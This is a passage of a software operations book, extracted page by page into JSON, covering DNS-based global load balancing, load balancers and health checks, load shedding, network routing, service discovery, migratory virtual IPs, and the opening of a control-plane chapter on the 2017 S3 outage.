offline, or doesn’t have any healthy instance to serve the request, the GSLB server won’t even give out the IP address of the pool.\n\nreport erratum • discuss",
      "content_length": 1948,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 185,
      "content": "Chapter 9. Interconnect • 176\n\nThe second trick is that different GSLB servers may give back different IP addresses for the same request. This can be to balance across several local pools, or to provide the closest point of presence for the client. The following figure illustrates this process.\n\n200 OK ...\n\nEU Name Server204.74.70.31\n\nEU Pool 1184.72.248.171\n\nprice.example.com?\n\nCaller\n\n184.72.248.171\n\nGET /price\n\nGET /price\n\n200 OK ...\n\nNA Name Server162.159.24.4\n\nprice.example.com?\n\n151.101.116.133\n\nInstance 2eu-price-2.example.com10.147.212.102\n\n1. First the caller queries DNS for the address related to “price.example.com.”\n\n2. Both GSLB servers might respond. Each one returns a different address for “price.example.com.” The European server returns 184.72.248.171, while the North American server returns 151.101.116.113. In this example, the client is in Europe, so it probably got the response with 184.72.248.171 first.\n\n4. The client now connects directly to 184.72.248.171, which is served by the load balancer. The load balancer directs traffic to the instances just as it normally would. It’s important to keep in mind that this sequence operates at two different levels. At the global level, it’s based on DNS and clever schemes for deciding which IP address to offer. After name resolution, it’s out of the picture. The load balancer (sometimes called a “local traffic manager”) operates as a reverse proxy so the actual call and response pass through it.\n\nThis approach also requires that the caller can reach both the global traffic managers and the local traffic managers.\n\nThis scenario just illustrates the most basic use of GSLB. In practice, the global traffic managers can apply a ton of intelligence to the routing decision. For instance, the previous figure assumed that each GSLB server only knew about its local pools. In a real deployment, each would have all the pools configured but would prefer to send traffic nearby. That allows them to direct traffic to the more distant pool if that’s the only one available. They can also\n\nreport erratum • discuss",
      "content_length": 2090,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 186,
      "content": "Load Balancing • 177\n\napply weighted distribution and a host of load-balancing algorithms. These can be used as part of a disaster recovery strategy or even part of a rolling deployment process.\n\nAvailability of DNS\n\nDNS relies on servers that can answer queries. What happens when those servers themselves are unavailable? It doesn’t matter how great the service’s availability is when callers can’t find out how to reach it. DNS can become neglected because it’s part of the invisible infrastructure. But a DNS outage can have a massive impact.\n\nThe main emphasis for DNS servers should be diversity. Don’t host them on the same infrastructure as your production systems. Make sure you have more than one DNS provider with servers in different locations. Use a different DNS provider still for your public status page. Make sure there are no failure scenarios that leave you without at least one functioning DNS server.\n\nRemember This\n\nWe covered a lot of ground in this section. It’s worth summarizing the uses and limitations of DNS.\n\nUse DNS to call services when they don’t change often.\n\nDNS round-robin offers a low-cost way to load-balance.\n\n“Discovery” is a human process. DNS names are supplied in configuration.\n\nDNS works well for global traffic management in coordination with local\n\nload balancers.\n\nDiversity is crucial in DNS hosts. Don’t rely on the same infrastructure\n\nfor DNS hosts and production services.\n\nLoad Balancing\n\nAlmost everything we build today uses horizontally scalable farms of instances that implement request/reply semantics. Horizontal scaling helps with overall capacity and resilience, but it introduces the need for load balancing. Load balancing is all about distributing requests across a pool of instances to serve all requests correctly in the shortest feasible time. In the previous section we looked at DNS round-robin as a means of load balancing. In this section we will consider active load balancing. This involves a piece of hardware or soft- ware inline between the caller and provider instances, as illustrated in the figure on page 178.\n\nreport erratum • discuss",
      "content_length": 2118,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 187,
      "content": "Chapter 9. Interconnect • 178\n\npool Nadmininterface\n\nLoad Balancer\n\nServiceInstances\n\nVIP 1pool 1\n\nServiceInstances\n\npool 2\n\nVIP 3\n\nVIP 4NIC(s)\n\nVIP 2\n\nServiceInstances\n\nAll types of active load balancers listen on one or more sockets across one or more IP addresses. These IP addresses are commonly called “virtual IPs” or “VIPs.” A single physical network port on a load balancer may have dozens of VIPs bound to it, as shown above. Each of these VIPs maps to one or more “pools.” A pool defines the IP addresses of the underlying instances along with a lot of policy information:\n\nThe load-balancing algorithm to use • What health checks to perform on the instances • What kind of stickiness, if any, to apply to client sessions • What to do with incoming requests when no pool members are available\n\nTo a calling application, the load balancer should be transparent. At least, that’s the case when it works. If the client can tell there’s a load balancer involved, it’s probably broken.\n\nThe service provider instances sitting behind the proxy server need to generate URLs with the DNS name of the VIP rather than their own hostnames. (They shouldn’t be using their own hostnames anyway!)\n\nLoad balancers can be implemented in software or with hardware. Each has its advantages and disadvantages. Let’s dig into the software load balancers first.\n\nSoftware Load Balancing\n\nSoftware load balancing is the low-cost approach. It uses an application to listen for requests and dole them out across the pool of instances. This application is basically a reverse proxy server, as shown in the figure on page 179.\n\nreport erratum • discuss",
      "content_length": 1636,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 188,
      "content": "Load Balancing • 179\n\nGET /index.html\n\nReverse Proxy Serverwww.example.com\n\nWeb Server 1ws1.example.com\n\nGET /index.html\n\n200 OK ...\n\nUser's Browser\n\n200 OK ...\n\nA normal proxy multiplexes many outgoing calls into a single source IP address. A reverse proxy server does the opposite: it demultiplexes calls coming into a single IP address and fans them out to multiple addresses. Squid,1 HAProxy,2 Apache httpd,3 and nginx4 all make great reverse proxy load balancers.\n\nLike DNS round-robin, reverse proxy servers do their magic at the application layer. As such, they aren’t fully transparent, but adapting to them isn’t onerous. Logging the source address of the request is useless, because it will represent only the proxy server. Well-behaved proxies will add the “X-Forwarded-For” header to incoming HTTP requests, so services can use a custom log format to record that.\n\nIn addition to load balancing, you can configure reverse proxy servers to reduce the load on the service instances by caching responses. This provides some benefits in reducing the traffic on the internal network. If the service instances are the capacity constraint in the system, then offloading this traffic improves the system’s overall capacity. Of course, if the load balancer itself is the constraint, then this has no effect.\n\nThe biggest reverse proxy server “cluster” in the world is Akamai. Akamai’s basic service functions exactly like a caching proxy. Akamai has certain advantages over Squid and HAProxy, including a large number of servers located near the end users, but is otherwise logically equivalent.\n\nBecause the reverse proxy server is involved in every request, it can get bur- dened very quickly. Once you start contemplating a layer of load balancing in front of your reverse proxy servers, it’s time to look at other options.\n\n1. 2. 3. 4.\n\nwww.squid-cache.org\n\nwww.haproxy.org\n\nhttp://httpd.apache.org\n\nhttps://nginx.org\n\nreport erratum • discuss",
      "content_length": 1950,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 189,
      "content": "Chapter 9. Interconnect • 180\n\nHardware Load Balancing\n\nHardware load balancers are specialized network devices that serve a similar role to the reverse proxy server. These devices, such as F5’s Big-IP products, provide the same kind of interception and redirection capabilities as the reverse proxy software. Because they operate closer to the network, hardware load balancers provide better capacity and throughput, as illustrated in the following figure.\n\n200 OK ...\n\nHW Load Balancerwww.example.com\n\nWeb Server 1ws1.example.com\n\nGET /index.html\n\nUser's Browser\n\n200 OK ...\n\nWeb Server 2ws2.example.com\n\nGET /healthy.html\n\n200 OK ...\n\nGET /healthy.html\n\nGET /index.html\n\nHardware load balancers are application-aware and can provide switching at layers 4 through 7 of the OSI stack. In practice, this means they can load- balance any connection-oriented protocol, not just HTTP or FTP. I’ve seen these successfully employed to load-balance a group of search servers that didn’t have their own load managers. They can also hand off traffic from one entire site to another, which is particularly useful for diverting traffic to a failover site for disaster recovery. This works well in conjunction with global server load balancing (see Global Server Load Balancing with DNS, on page 175).\n\nThe big drawback to these machines is—of course—their price. Expect to pay in the five digits for a low-end configuration. High-end configurations easily run into six digits.\n\nHealth Checks\n\nOne of the most important services a load balancer can provide is service health checks. The load balancer will not send traffic to an instance that fails a certain number of health checks. Both the frequency and number of failed\n\nreport erratum • discuss",
      "content_length": 1738,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 190,
      "content": "Load Balancing • 181\n\nchecks are configurable per pool. Refer back to Health Checks, on page 169, for some details about good health checks.\n\nStickiness\n\nLoad balancers can also attempt to direct repeated requests to the same instance. This helps when you have stateful services, like user session state, in an application server. Directing the same requests to the same instances will provide better response time for the caller because necessary resources will already be in that instance’s memory.\n\nA downside of sticky sessions is that they can prevent load from being dis- tributed evenly across machines. You may find a machine running “hot” for a while if it happens to get several long-lived sessions.\n\nStickiness requires some way to determine how to group “repeated requests” into a logical session. One common approach has the load balancer attach a cookie to the outgoing response to the first request. Subsequent requests are hashed to an instance based on the value of that cookie. Another approach is to just assume that all incoming requests from a particular IP address are the same session. This approach will break badly if you have a reverse-proxy upstream of the load balancer. It also breaks when a large portion of your customer base reaches you through an outbound proxy in their network. (Looking at you, AOL!)\n\nPartitioning Request Types\n\nAnother useful way to employ load balancers is “content-based routing.” This approach uses something in the URLs of incoming requests to route traffic to one pool or another. For example, search requests may go to one set of instances, while use-signup requests go elsewhere. A large-scale data provider may direct long-running queries to a subset of machines and cluster fast queries onto a different set. Of course, something in the requests must be evident to the load balancer.\n\nRemember This\n\nLoad balancers are integral to the delivery of your service. We cannot treat them as just part of the network infrastructure any more.\n\nLoad balancing plays a part in availability, resilience, and scaling. Because so many application attributes depend on them, it pays to incorporate load- balancing design as you build services and plan deployment. If your organi- zation treats load balancers as “those things over there” that some other team\n\nreport erratum • discuss",
      "content_length": 2333,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 191,
      "content": "Chapter 9. Interconnect • 182\n\nmanages, then you might even think about implementing a layer of software load balancing under your control, entirely behind the hardware load balancers in the network.\n\nLoad balancing creates “virtual IPs” that map to pools of instances.\n\nSoftware load balancers work at the application layer. They’re low cost\n\nand easy to operate.\n\nHardware load balancers reach much higher scale than software load bal- ancers. They do require direct network access and specific engineering skills.\n\nHealth checks are a vital part of load balancer configuration. Good health checks ensure that requests can succeed, not just that the service is lis- tening to a socket.\n\nSession stickiness can help response time for stateful services.\n\nConsider content-aware load balancing if your service can process work-\n\nload more efficiently when it is partitioned.\n\nDemand Control\n\nIn the “good old days” of mainframes in glass houses, we could predict what the workload looked like from day to day. Operators would measure how many MIPS (millions of instructions per second...now don’t snicker, those machines did the best they could) a given job needed. Those days are long gone. Most of our services are either directly or indirectly exposed to the entire world’s population.\n\nOur daily reality is this: the world can crush our systems at any time. There’s no natural protection. We have to build it. There are two basic strategies: either refuse work or scale out. For the moment, we’ll consider when, where, and how to refuse work.\n\nHow Systems Fail\n\nEvery failing system starts with a queue backing up somewhere.\n\nWhen thinking about request/reply workload, we need to consider the resources being consumed and the queues to get access to those resources. That’ll let us decide where to cut off new requests. Each request obviously consumes a socket on each tier it passes through. While the request is active on an instance, that instance has one fewer ephemeral sockets available for new requests. In fact, that socket is consumed for a little while after the request completes. (See TIME_WAIT and the Bogons, on page 185.)\n\nreport erratum • discuss",
      "content_length": 2166,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 192,
      "content": "Demand Control • 183\n\nThere’s a relationship between the number of sockets available and the number of requests per second your service can handle. That relationship depends on the duration of the requests. (They are related via “Little’s law.”5) The faster your service retires requests, the more throughput it can handle. But we’re talking about systems under high levels of load. It’s natural to expect your service to slow down under heavy load, but that means fewer and fewer sockets are available to receive requests exactly when the most requests are coming in! We call that “going nonlinear,” and we don’t mean it in a good way.\n\nThe next resource to consider is raw I/O bandwidth through the NICs. No matter how many virtual NICs your machine has, or how many sockets your instance has open, Ethernet is inherently a serial protocol. It takes time to shove packets through the wires. Any packet you want to send while the port is busy just has to get in line. On the flip side, applications only receive packets when they are ready. Anything that arrives on the NIC in the meantime has to be buffered until the application calls some form of read on the socket. On both the transmit side and the receive side, a finite amount of RAM is allocated to these buffers. Any data that goes into those buffers has to work its way through the queue. When the write buffers are full, the TCP stack won’t accept any new writes and write calls will block. When the read buffers are full, the stack won’t accept any new incoming data and the connection will stall. (Eventually, that backs up into the sending application and the write call there also blocks.)\n\nWhen is the application most likely to be slow at reading from TCP buffers? Exactly when it’s under high load, another nonlinear effect.\n\nThere’s another kind of queue involved, which is the “listen queue” on the server’s socket. TCP connection requests can get through the three-phase handshake but then have to wait for the application to accept the connection. When the application calls accept, the server’s TCP stack removes the connection from the listen queue and hands it over for reads and writes. (See the “three- way handshake,” on page 37, for a refresher.) If a connection request sits in that queue long enough, the client will eventually give up and abandon the connection. If the listen queue is full, clients that attempt to connect will work their way through a series of delayed retries and then ultimately give up.\n\nAs requests from the outside world reach further into the system, they activate resources at every tier until the work can be retired. A single request at the network edge may translate into a tree of service requests through many layers of internal structure. Each request means transient load on a provider’s\n\n5.\n\nhttps://en.wikipedia.org/wiki/Little%27s_law\n\nreport erratum • discuss",
      "content_length": 2879,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 193,
      "content": "Chapter 9. Interconnect • 184\n\nlisten queue and persistent load on its sockets and NICs. Under high load those resources are held longer, which further extends response times for the new incoming work. At some point, the response time for one or more services extends past the caller’s timeout. The caller will stop waiting for a response on the original request and probably fire a retry at us (exactly when it hurts the worst!).\n\nPreventing Disaster\n\nWith that perspective, we can see that the best thing to do under high load is turn away work we can’t complete in time. This is called “load shedding,” and it’s the most important way to control incoming demand.\n\nLoad shedding happens very quickly when a socket’s listen queue is full, and a quick rejection is better than a slow timeout.\n\nMore generally, we want to shed load as early as possible so we can avoid tying up resources at several tiers before rejecting the request. Load balancers near the network edge are the ideal place. A good health check on the first tier of services can inform the load balancer when response times are too high (in other words, higher than the service’s SLA). The load balancer also needs to be configured to send back an HTTP 503 response code when all instances fail their health checks. That’s a quick response to the caller that says “too busy, try later.”\n\nServices can measure their own response time to help with this. They can also check their own operational state to see if requests will be answered in a timely fashion. For instance, monitoring the degree of contention for a connection pool allows a service to estimate wait times. Likewise, a service can check response times on its own dependencies. If those dependencies are too slow and are required, then the health check should show that this service is unavailable. This provides back pressure through service tiers.\n\nServices should also have relatively short listen queues. Every request spends some time in the listen queue and some time in processing. We call the total of that time the “residence time.” If our service needs to respond in 100 mil- liseconds or less, that’s the allowed residence time. Many people go wrong by measuring just their own processing time. That’s why the service itself may think all is well while its consumers complain that it’s slow. The listen queue is serial while processing is multithreaded, so queuing time ultimately domi- nates processing time. The queuing math gets a bit hairy here, and Little’s law doesn’t apply very well when you hit boundaries and maximum queue length. You’ll need to know whether the service is exposed directly to the\n\nreport erratum • discuss",
      "content_length": 2673,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 194,
      "content": "Demand Control • 185\n\nInternet—an infinite source of demand for all practical purposes—or whether it’s internal, where the demand population is finite. (If you want to model this precisely, check out Dr. Neil Gunther’s “PDQ” analyzer toolkit.6) If you want to apply a heuristic, take your maximum wait time divided by mean processing time and add one. Multiply that by the number of request handling threads you have and bump it up by 50 percent. That’s a reasonable starting point for your listen queue length.\n\nBecause clients retry TCP connections, it can also be useful to run a “listen queue purge” when the service can’t keep up with demand. This is a kind of self-awareness that goes along with the idea of a “yellow alert” or “red alert” status. A listen queue purge just looks like a tight loop that accepts connec- tions and then immediately responds with a canned rejection. For example, you can have a string constant that just says 503 Try Again\\r\\n\\r\\n.\n\nTIME_WAIT and the Bogons\n\nA closed socket sits in the TIME_WAIT state for a bit to make sure that any stray packets wandering around the Internet either time out or arrive to be dropped. Suppose there were no such TIME_WAIT state. A server could close socket 32768 and then reallocate it to a new request. Meanwhile, a delayed packet could arrive that’s left over from the old connection. Under very rare circumstances, it might even have a sequence number that matches the server’s expectations. The server would seem to receive some bizarre data from nowhere. The current client didn’t send it, and now the TCP stream is out of sync. Such a packet is called a “bogon,” and TIME_WAIT is the antibogon protection.\n\nServices that only deal with work inside a data center can set a very low TIME_WAIT to free up those ephemeral sockets. Just be sure to reduce the machine’s TCP setting for the default “time to live” on packets accordingly. On Linux, take a look at the tcp_tw_reuse kernel setting.\n\nRemember This\n\nUnless you built your service in a cave with a box of scraps, it probably has to deal with Internet-scale load. Either it directly handles requests from the world at large, or it serves some other piece of code that does. We have no control over the traffic patterns and mercurial behavior of that population, so our services need to protect themselves when the load gets too heavy.\n\nReject work as close to the edge as possible. The further it penetrates into\n\nyour system, the more resources it ties up.\n\n6.\n\nwww.perfdynamics.com/Tools/PDQ.html\n\nreport erratum • discuss",
      "content_length": 2554,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 195,
      "content": "Chapter 9. Interconnect • 186\n\nProvide health checks that allow load balancers to protect your applica-\n\ntion code.\n\nStart rejecting work when your response time is going to provoke retries.\n\nNetwork Routing\n\nBecause machines in a data center usually have multiple network interfaces, questions will sometimes arise about which interfaces particular kinds of traffic should traverse. For example, it’s relatively common to see a machine with a front-end network interface connected to one VLAN for communication to the web servers and a back-end network interface connected to a different VLAN for communication to the database servers. In this case, the server must be told which interface to use in order to reach a particular destination IP address.\n\nIn the case of nearby servers, the routes are probably easy; they’ll just be based on the subnet addresses. In the example of the application server, the back-end interface probably shares a subnet with the database server, while the front-end interface probably shares a subnet with the web servers. Routing gets a bit more complicated when distant services—perhaps third-party ser- vices—are involved.\n\nModern operating systems strive to make routing automatic and invisible. When a machine brings up its primary NIC (whichever one it happens to think is primary, anyway), it uses the main IP address for that NIC as its “default gateway.” That becomes the first entry in the routing table for the host. As the host gets cozier with its switches, they gossip about routes and the host updates its routing table. That table tells the operating system which NIC to use to reach a destination address or network. When an application sends a packet, the host checks the destination IP address against the routing table to see if it knows how to move that packet a hop closer to its destination.\n\nMost of the time, this “just works.” Occasionally, though, you can run into problems when multiple routes seem plausible to the host but aren’t actually equivalent. Consider the case of a service provided by a close business partner. If the integration includes personally identifiable information (PII), then you might set up a VPN rather than send sensitive data straight over the public Internet. Depending on a ton of configuration options that are outside your control, both the VPN and the primary switch may advertise routes that could reach the destination address.\n\nreport erratum • discuss",
      "content_length": 2447,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 196,
      "content": "Network Routing • 187\n\nIn the best case, you’ll discover this problem during testing because nothing will reach the partner’s service. Your service won’t be able to open a socket and will get a “destination unreachable” response.7 How is that the best case? A consistent error is much better than intermittent success. If the host hap- pens to receive route advertisements in the right order, it might send those sensitive packets over the VPN. If it gets them in the wrong order, it may try to send them over the front-end—in other words, the public—network. Here’s hoping the partner is better at networking and won’t accept connections. Otherwise, that PII will be sent in cleartext over the public Internet. Worse still, your service will appear to be working normally so you won’t even know it’s happening.\n\nOne solution is static route definitions. Network admins officially frown on static routes, but sometimes they’re the only way.\n\nAnother increasingly common solution to routing is software-defined network- ing. This goes hand-in-hand with virtualized infrastructure and container- based infrastructure. Containers and VMs use virtual IP addresses, VLAN tagging, and virtual switches to create a kind of “network on a network.” The packets still run over the same wires, but the host machine’s IP address is not involved. This lets the virtual switches operate independently of the physical ones. They can assign IPs from private pools, attach DNS names to those IPs to identify services, and dynamically create firewalls and subnets.\n\nUnreliable Enumeration\n\nIn one customer environment, we found that two different machines labeled their network interfaces in different orders. Both machines ran the same version of the same operating system. They were the same hardware model. But somehow, the leftmost network port on one machine appeared as the first network interface, while the leftmost network port on the other machine appeared as the second network interface. Imagine if “eth0” was the primary NIC on one machine but “eth1” was pri- mary on another. Yet both of them had “eth0” connected to the front-end switch.\n\nThat means the first machine had its default gateway properly set to the public-facing switch, while the second machine was trying to use an administrative switch to send out all its traffic.\n\nWe eventually found a low-level override in the host management controller—similar to the BIOS settings on a PC. For whatever reason, the two machines arrived with slightly different configurations, possibly because they were bought at different times.\n\n7.\n\nhttps://en.wikipedia.org/wiki/Internet_Control_Message_Protocol#Destination_unreachable\n\nreport erratum • discuss",
      "content_length": 2700,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 197,
      "content": "Chapter 9. Interconnect • 188\n\nGetting these routing issues right requires paying attention to each and every integration point. Getting them wrong risks reduced availability or, worse, exposure of customer data. For each connection to a remote system, I recom- mend keeping a record in a spreadsheet or a database with the destination name, address, and desired route. Someday, somebody is going to need that information to write firewall rules anyway.\n\nDiscovering Services\n\nThere are two cases where service discovery becomes important. First, your organization may have too many services for DNS management to be practical. Second, you may be in a highly dynamic environment. Container-based environments usually hit both of these criteria, but that’s not the only case.\n\n“Service discovery” really has two parts. First, it’s a way that instances of a service can announce themselves to begin receiving a load. This replaces statically configured load balancer pools with dynamic pools. Any kind of load balancer—whether done with hardware or software—can do this. It doesn’t require a special “cloud aware” load balancer.\n\nThe second part is lookup. A caller needs to know at least one IP address to contact for a particular service. The lookup process can appear to be a simple DNS resolution for the caller, even if some super-dynamic service-aware server is supplying the DNS service.\n\nService discovery is itself another service. It can fail or get overloaded. It’s a good idea for clients to cache results for a short time.\n\nIt’s best not to roll your own service discovery. Like connection pools and crypto libraries, there’s a world of difference between writing one that works and writing one that always works.\n\nYou can build a service discovery mechanism on top of a distributed data store such as Apache ZooKeeper or etcd.8,9 In these cases, you’ll wrap the low-level access with a library to make it both easier and more reliable to use these databases. Just as an example, in the terminology of the CAP theorem,10 ZooKeeper is a “CP” system. That means when there’s a network partition (and there will be a network partition), some nodes won’t answer queries or accept writes. Since clients need to be available, they must have a fallback to use other nodes or previously cached results. It’s not reasonable to expect\n\n8. 9. 10. https://en.wikipedia.org/wiki/CAP_theorem https://coreos.com/etcd\n\nhttp://zookeeper.apache.org\n\nreport erratum • discuss",
      "content_length": 2467,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 198,
      "content": "Migratory Virtual IP Addresses • 189\n\nevery client to implement this behavior. Pinterest published a good experience report about using ZooKeeper for service discovery.11\n\nHashiCorp’s Consul resembles ZooKeeper in that it operates as a distributed database.12 However, Consul’s architecture places it in the “AP” arena, so it prefers to remain available and risk stale information when a partition occurs. In addition to service discovery it also handles health checks.\n\nSome other service discovery tools integrate directly with the control plane of PaaS platforms. For example, when Docker Swarm starts containers to run service instances, it automatically registers them with the swarm’s dynamic DNS and load-balancing mechanism.\n\nThis is a rapidly evolving space. As you can see, these tools have different considerations for each. They cover different scope and are subject to divergent behavior in failure cases. In fact, each one could occupy its own chapter, complete with cautions about sharp edges and detailed discussion about the boundary between the tools’ features and your applications’ responsibilities. Such chapters would probably be outdated by the time this book reaches print, or even epub, for that matter. There’s no plug-and-play replaceability. Choosing one is not a simple matter, and replacing one will have wide-reaching conse- quences. The only real answer here is to do your homework and commit to solving implementation challenges with whichever tool you choose.\n\nMigratory Virtual IP Addresses\n\nSuppose the server hosting a critical—but not natively clustered—application goes down. The cluster server on its failover node notices the lack of a regular heartbeat from the failed server. This cluster server then decides that the original server has failed. It starts up the application on the secondary server, including mounting any required filesystems. It also takes over the virtual IP address assigned to the clustered network interface.\n\nUnfortunately, the term virtual IP is overloaded. Generally speaking, it means an IP address that is not strictly tied to an Ethernet MAC address. Cluster servers use it to migrate ownership of the address between the members of the cluster. Load balancers use virtual IPs to multiplex many services (each with its own IP address) onto a smaller number of physical interfaces. There’s some overlap here, since load balancers typically come in pairs, so the virtual IP (as in “service address”) can also be a virtual IP (as in “migrating address”).\n\n11. https://medium.com/@Pinterest_Engineering/zookeeper-resilience-at-pinterest-adfd8acf2a6b 12. https://www.consul.io\n\nreport erratum • discuss",
      "content_length": 2669,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 199,
      "content": "Chapter 9. Interconnect • 190\n\nThis kind of virtual IP address is just an IP address that can be moved from one NIC to another as needed. At any given time, exactly one server claims the IP address. When the address needs to be moved, the cluster server and the operating systems collaborate to do some funny stuff in the lower layers of the TCP/IP stack. They associate the IP address with a new MAC address (hardware address) and advertise the new route (ARP). The following figure depicts a virtual IP address before and after the active node fails.\n\nServer 1active\n\nSwitch 1\n\nReal IP172.16.64.190\n\nServer 2passive\n\nReal IP172.16.64.191Virtual IP172.16.67.10Before Failover\n\nServer 1failed\n\nSwitch 1\n\nReal IP172.16.64.190\n\nServer 2active\n\nReal IP172.16.64.191Virtual IP172.16.67.10After Failover\n\nThis kind of migratory IP address is often used for active/passive database clusters. Clients connect only using the DNS name for the virtual IP address, not to the hostnames of either node in the cluster. That way, no matter which node currently holds the IP address, the client can connect to the same name.\n\nOf course, this approach cannot migrate the in-memory state of the applica- tion. As a result, any nonpersistent state about interactions will be lost. For databases, this includes uncommitted transactions. Some database drivers —such as Oracle’s JDBC and ODBC drivers—will automatically reexecute queries that are aborted because of a failover. Updates, inserts, or stored procedure calls cannot be automatically repeated. Therefore, any application calling a database through a virtual IP should be prepared to get a SQLException when such a failover occurs.\n\nIn general, if your application calls any other service through a handoff virtual IP, it must be prepared for the possibility that the next TCP packet isn’t going to the same interface as the last packet. This can cause IOExceptions in strange places. The application logic must be prepared to handle that error—and handle it differently than just a “destination unreachable” error. If at all pos- sible, the application should retry its request against the new node (but see Circuit Breaker, on page 95, for some important safety limits on retries).\n\nreport erratum • discuss",
      "content_length": 2249,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 200,
      "content": "Wrapping Up • 191\n\nWrapping Up\n\nWe looked at the interconnect layer in this chapter, where instances come together to form systems. Load balancing, routing, load shedding, and service discovery are some of the key issues to consider when building this layer. Depending on your organization, you may have existing solutions in place to plug into. That can be a big help, because some of the most powerful tools require operational support that makes them costly to support by a single team.\n\nNext, we continue zooming out to look at control over this whole extended mélange of application instances and infrastructure tools. We will see what it takes to deploy, monitor, and intervene with systems running in production.\n\nreport erratum • discuss",
      "content_length": 745,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 201,
      "content": "CHAPTER 10\n\nControl Plane\n\nIn the preceding chapters we worked our way up from bare metal through layers of abstraction and virtualization to create a sea of instances running on machines. We’ve got software scattered around like an upended box of LEGO blocks. It’s up to the “control plane” to put these pieces in the right place and knit them together into a somewhat coherent whole.\n\nThe control plane encompasses all the software and services that run in the background to make production load successful. One way to think about it is this: if production user data passes through it, it’s production software. If its main job is to manage other software, it’s the control plane.\n\nA challenge we’ll face in this chapter is that the solution space is not well partitioned among tools, packages, and vendors. It’s nowhere near as simple as picking one download from each column. There are overlaps and gaps. Not every combination will work together. No single package does everything. We are left with a lot of integration effort and plenty of trial and error.\n\nHow Much Is Right for You?\n\nAs we look at the control plane, keep in mind that every part of this is optional. You can do without every piece of it, if you’re willing to make some trade-offs. For example, logging and monitoring helps with postmortem analysis, incident recovery, and defect discovery. Without it, all those will take longer or simply not be done. If you can live with extended outages, or if it’s okay to find out your software is down by getting a call from the CEO, then you don’t need that part of the control plane.\n\nIn a more palatable example, you don’t need IP management software if you’re running a static network on physical hardware. Up to a certain scale, this is probably acceptable and may be more cost-effective. Once you move to an\n\nreport erratum • discuss",
      "content_length": 1852,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 202,
      "content": "Chapter 10. Control Plane • 194\n\noverlay network with multiple VLANs and software switches, you’ll go mad without IP management.\n\nThe more sophisticated your control plane becomes, the more it costs to implement and operate. Every piece represents ongoing operational cost. Think of it like trading off the fixed cost of dedicated people versus the variable cost of speeding up deployments, incident recovery, provisioning services, and so on. If you’re small and the rate of change is low, you may find it’s not worth it. If you can amortize the cost of a platform team across hundreds of services deployed hundreds of times per year, then it makes a lot more sense.\n\nThis cost equation isn’t static, either. New open-source operations tools are released nearly every day. These are often created by a large-scale company scratching its own itch, but these companies release tools and libraries that lift up everyone else in the industry. When the first edition of this book was published in 2007, logging and monitoring was almost entirely a commercial market. Now it is almost entirely open source. At that time, automated provi- sioning of operating systems required either a large commercial package (six figures in license cost, six more in implementation cost) or a complete roll- your-own approach. Today, the hardest problem is choosing among all the fantastic alternatives!\n\nBottom line: Don’t assume you must install one of everything you read about. But also keep evaluating the overhead and difficulty of different solutions. The landscape changes pretty quickly.\n\nMechanical Advantage\n\n“Mechanical advantage” is the multiplier on human effort that simple machines provide. With mechanical advantage, a person can move something much heavier than themselves. With a long-enough lever and a place to stand, Archimedes claimed he could move Earth itself.\n\nThe kicker about mechanical advantage is that it works for good or for ill. High leverage allows a person to make large changes with less effort. We hope that those are mostly beneficial, such as releasing new software to a fleet of ten thousand machines. Unfortunately, there are many examples of automation gone wrong. Back in Force Multiplier, on page 80, we saw how Reddit suffered from overeager automation. The Governor pattern discussed in Governor, on page 123, aims to reduce the harm when automation goes the wrong way.\n\nLet’s consider an example from a real outage that affected many people and companies.\n\nreport erratum • discuss",
      "content_length": 2509,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 203,
      "content": "Mechanical Advantage • 195\n\nOn February 28, 2017, Amazon Web Services’ S3 service in the US-East-1 region went down. Tens of thousands of companies suffered outages due to their own hard dependencies on S3. Large parts of the Net pretty much went dark. Operators went nuts. Users hammered status sites until those crumbled too. (At least, they hammered status sites that weren’t themselves hosted on S3!) The total disruption in S3 lasted about two hours, but it was many more hours before all the S3 consumers were healthy. It was “reboot day” for a big chunk of the SaaS market.\n\nAmazon, like other service providers, has learned that customer confidence can really be shaken with an event like this. One of the most important pieces of communication afterward is a postmortem review of the outage. Every postmortem review has three important jobs to do:\n\n1. Explain what happened.\n\n2. Apologize.\n\n3. Commit to improvement.\n\nAmazon’s write-up does a good job at all three of these.1 There are some really interesting lessons for us in that postmortem.\n\nSystem Failure, Not Human Error\n\nAmazon clearly states that “[a]n authorized S3 team member using an established playbook executed a command which was intended to remove a small number of servers for one of the S3 subsystems that is used by the S3 billing process. Unfortunately, one of the inputs to the command was entered incorrectly and a larger set of servers was removed than intended.” Parsing that just a little bit, we can understand that someone mistyped a command. First and foremost, whoever that was has my deepest sympathy. I’ve felt that shock and horror when I realized that I, personally, had just caused an outage. It’s a terrible feeling. But there’s much more that we should learn from this.\n\nTake a moment to read or reread that postmortem. The words “human error” don’t appear anywhere. It’s hard to overstate the importance of that. This is not a case of humans failing the system. It’s a case of the system failing humans. The administrative tools and playbooks allowed this error to happen. They amplified a minor error into enormous consequences. We must regard this as a system failure. “System” here means the whole system—S3 plus the control plane software and human processes to manage it all.\n\n1.\n\nhttps://aws.amazon.com/message/41926\n\nreport erratum • discuss",
      "content_length": 2346,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 204,
